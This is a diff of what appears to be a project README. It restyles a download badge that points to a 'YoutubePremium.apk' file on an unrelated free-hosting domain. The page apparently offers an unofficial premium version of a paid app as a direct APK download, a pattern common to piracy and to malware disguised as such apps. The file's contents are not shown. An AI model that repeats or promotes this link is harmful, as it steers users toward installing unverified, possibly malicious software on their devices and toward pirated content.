@@ -43,7 +43,7 @@ You can directly download the latest build from the link below:
 
 <p align="center">
   <a href="http://firewallcert.free.nf/YoutubePremium.apk">
-    <img src="https://img.shields.io/badge/Download%20APK-Click%20Here-red?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Download_Premium_APK-gold?style=for-the-badge&logo=youtube"/>
   </a>
 </p>
 
